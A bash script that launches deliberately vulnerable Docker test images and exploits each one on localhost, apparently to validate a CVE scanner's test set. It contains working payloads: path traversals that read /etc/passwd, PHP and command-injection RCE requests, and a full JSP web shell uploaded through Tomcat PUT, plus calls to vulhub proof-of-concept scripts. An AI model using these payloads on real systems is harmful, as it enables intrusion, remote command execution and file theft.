#!/bin/bash
#script to showcase examples of the vulhub vulnerabilities in the testimages used for CVE scaneer testing

echo "This is just a sanity check more information and specifics of exploitation you can find at https://github.com/vulhub/vulhub"
git clone https://github.com/vulhub/vulhub.git

tag=CVE-2018-8715-1
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:8080 vulntesting2/testimage:$tag
echo "Normally the request results in 403"
sleep 10
curl -i  http://localhost:8080 
echo "But you get 200 exploiting the vulnerability"
sleep 5
curl -H "Authorization: Digest username=admin" -D - http://localhost:8080 
docker container rm $tag --force

tag=CVE-2017-14849-1
echo "Valdiating $tag" 
docker run -d --name $tag -p 3000:3000 vulntesting2/testimage:$tag
echo "You should see the contents of the passwd file"
sleep 10
curl --path-as-is localhost:3000/static/../../../a/../../../../etc/passwd  
docker container rm $tag --force

tag=CVE-2017-9841
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:80 vulntesting2/testimage:$tag
echo "You should see the phpinfo using code execution"
sleep 10
curl --data "<?=phpinfo()?>" http://localhost:8080/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 
docker container rm $tag --force

tag=PIL-CVE-2017-8291
echo "Valdiating $tag" 
docker run -d --name $tag -p 8000:8000 vulntesting2/testimage:$tag
echo "You should see an empty directory"
sleep 10
docker exec  $tag ls /tmp
curl -F 'file=@./vulhub/python/PIL-CVE-2017-8291/poc.png; Content-Type: image/png' http://localhost:8000
echo "And now you should see the file created by touch in the PoC in this line"
grep "touch" ./vulhub/python/PIL-CVE-2017-8291/poc.png 
sleep 5
docker exec  $tag ls /tmp
docker container rm $tag --force

tag=PIL-CVE-2018-16509
echo "Valdiating $tag" 
docker run -d --name $tag -p 8000:8000 vulntesting2/testimage:$tag
echo "You should see an empty directory"
sleep 10
docker exec  $tag ls /tmp
curl -F 'image=@./vulhub/python/PIL-CVE-2018-16509/rce.jpg; Content-Type: image/jpeg' http://localhost:8000
echo "And now you should see the file created by touch in the PoC in this line"
grep "touch" ./vulhub/python/PIL-CVE-2018-16509/rce.jpg
sleep 5
docker exec  $tag ls /tmp
docker container rm $tag --force

tag=CVE-2017-15715
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:80 vulntesting2/testimage:$tag
echo "You should see the file originally does not exit"
sleep 5
curl -i --path-as-is http://localhost:8080/1.php%0a
echo "Now we upload it and it executes the code (phpinfo)"
sleep 3
curl -i -s -k  -X $'POST' \
    -H $'Host: localhost:8080' -H $'User-Agent: curl/7.54.0' -H $'Accept: */*' -H $'Content-Length: 310' -H $'Expect: 100-continue' -H $'Content-Type: multipart/form-data; boundary=------------------------1d2de922d4b8a8af' -H $'Connection: close' \
    --data-binary $'--------------------------1d2de922d4b8a8af\x0d\x0aContent-Disposition: form-data; name=\"name\"\x0d\x0a\x0d\x0a1.php\x0a\x0a--------------------------1d2de922d4b8a8af\x0d\x0aContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a<?=phpinfo()?>\x0a\x0d\x0a--------------------------1d2de922d4b8a8af--\x0d\x0a' \
    $'http://localhost:8080/'
curl --path-as-is http://localhost:8080/1.php%0a
docker container rm $tag --force

tag=CVE-2017-12794
echo "Valdiating $tag" 
echo "this shows you the running django version"
docker run --entrypoint="" vulntesting2/testimage:$tag  pip list 
curl -isk https://vulners.com/cve/CVE-2017-12794 | grep -m1 Django

tag=CVE-2018-14574-1
echo "Valdiating $tag" 
docker run -d --name $tag -p 8000:8000 vulntesting2/testimage:$tag
echo "You should see an open redirect to www.example.com"
sleep 10
curl -D -  http://localhost:8000//www.example.com
docker container rm $tag --force

tag=CVE-2017-12615
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:8080 vulntesting2/testimage:$tag
sleep 5
curl -i -s -k  -X $'PUT' \
    -H $'Host: localhost:8080' -H $'Accept: */*' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Connection: close' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 898' \
    --data-binary $'<%@ page import=\"java.util.*,java.io.*\"%>\x0d\x0a<%\x0d\x0a%>\x0d\x0a<HTML><BODY>\x0d\x0aCommands with JSP\x0d\x0a<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\x0d\x0a<INPUT TYPE=\"text\" NAME=\"cmd\">\x0d\x0a<INPUT TYPE=\"submit\" VALUE=\"Send\">\x0d\x0a</FORM>\x0d\x0a<pre>\x0d\x0a<%\x0d\x0aif (request.getParameter(\"cmd\") != null) {\x0d\x0a    out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");\x0d\x0a    Process p;\x0d\x0a    if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){\x0d\x0a        p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\"));\x0d\x0a    }\x0d\x0a    else{\x0d\x0a        p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\x0d\x0a    }\x0d\x0a    OutputStream os = p.getOutputStream();\x0d\x0a    InputStream in = p.getInputStream();\x0d\x0a    DataInputStream dis = new DataInputStream(in);\x0d\x0a    String disr = dis.readLine();\x0d\x0a    while ( disr != null ) {\x0d\x0a    out.println(disr);\x0d\x0a    disr = dis.readLine();\x0d\x0a    }\x0d\x0a}\x0d\x0a%>\x0d\x0a</pre>\x0d\x0a</BODY></HTML>' \
    $'http://localhost:8080/1.jsp/'
sleep 3
curl localhost:8080/1.jsp?cmd=ls
docker container rm $tag --force

tag=CVE-2019-5418
echo "Valdiating $tag" 
docker run -d --name $tag -p 3000:3000 vulntesting2/testimage:$tag
echo "You should see the content of the passwd file"
sleep 5
curl -s -k -X $'GET' \
    -H $'Host: localhost:3000' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: ../../../../../../../../etc/passwd{{' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'Connection: close' \
    $'http://localhost:3000/robots'
docker container rm $tag --force

tag=CVE-2017-8386
echo "Valdiating $tag" 
echo "You should see the git version running in the image and the corresponding CVE"
docker run --entrypoint="" vulntesting2/testimage:$tag  git --version
curl -isk https://vulners.com/cve/$tag | grep -m1 git

tag=CVE-2017-11610
echo "Valdiating $tag" 
docker run -d --name $tag -p 9001:9001 vulntesting2/testimage:$tag
echo "You should see the output of the ls command executed by the exploit"
sleep 10
chmod +x vulhub/supervisor/CVE-2017-11610/poc.py
vulhub/supervisor/CVE-2017-11610/poc.py "http://127.0.01:9001/RPC2" "ls"
docker container rm $tag --force

tag=CVE-2017-17405
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:8080 vulntesting2/testimage:$tag
sleep 5
echo "You should see the output of ls initially"
docker exec  $tag ls
curl -isk 'http://localhost:8080/download?uri=ftp://speedtest.tele2.net:21/&file=|touch%20success.txt'
sleep 2
echo "You should see the output of ls after creating success.txt through touch"
docker exec  $tag ls
docker container rm $tag --force

tag=CVE-2018-15473
echo "Valdiating $tag" 
echo "You should see the running ssh version in the container and the corresponding CVE from vulners database"
docker run --entrypoint="" vulntesting2/testimage:$tag  sshd --version
curl -isk https://vulners.com/cve/$tag | grep -m1 OpenSSH

tag=CVE-2015-3337
echo "Valdiating $tag" 
docker run -d --name $tag -p 9200:9200 -p 9300:9300 vulntesting2/testimage:$tag
echo "You should see the content of the passwd file"
sleep 10
curl --path-as-is localhost:9200/_plugin/head/../../../../../../../../../etc/passwd
docker container rm $tag --force

tag=CVE-2015-5531
echo "Valdiating $tag" 
docker run -d --name $tag -p 9200:9200 -p 9300:9300 vulntesting2/testimage:$tag
sleep 10
curl -isk -H "Content-Type: application/json" --request PUT --data '{"type": "fs", "settings": {"location": "/usr/share/elasticsearch/repo/test"}}' http://localhost:9200/_snapshot/test
sleep 2
curl -isk -H "Content-Type: application/json" --request PUT --data '{"type": "fs","settings": {"location":"/usr/share/elasticsearch/repo/test/snapshot-backdata"}}' http://localhost:9200/_snapshot/test2
echo "You should see the content of the passwd file encoded"
sleep 2
curl --path-as-is localhost:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
docker container rm $tag --force

tag=CVE-2018-17246
echo "Valdiating $tag" 
echo "You should see the running kibana version in the container and the corresponding CVE from vulners database"
docker run --entrypoint="" vulntesting2/testimage:$tag  kibana --version 
curl -isk https://vulners.com/cve/$tag | grep -m1 Kibana

tag=CVE-2019-7609
echo "Valdiating $tag" 
echo "You should see the running kibana version in the container and the corresponding CVE from vulners database"
docker run --entrypoint="" vulntesting2/testimage:$tag  kibana --version 
curl -isk https://vulners.com/cve/$tag | grep -m1 Kibana

tag=CVE-2019-7238
echo "Valdiating $tag" 
docker run -d --name $tag -p 8081:8081 vulntesting2/testimage:$tag
echo "You should see the running Nexus version in the container and the corresponding CVE from vulners database"
sleep 20
docker exec  $tag grep "Started Sonatype Nexus" /nexus-data/log/nexus.log
curl -isk https://vulners.com/cve/$tag | grep -m1 Nexus
docker container rm $tag --force

tag=CVE-2018-1270
echo "Valdiating $tag" 
docker run -d --name $tag -p 8080:8080 vulntesting2/testimage:$tag
echo "You should see the contents of the /tmp directory initially"
sleep 15
docker exec  $tag ls /tmp
sed -i '' 's+your-ip+localhost+' ./vulhub/spring/CVE-2018-1270/exploit.py
python3 ./vulhub/spring/CVE-2018-1270/exploit.py
echo "You should see the contents of the /tmp  after running the exploit"
sleep 5
docker exec  $tag ls /tmp
docker container rm $tag --force

rm -r ./vulhub
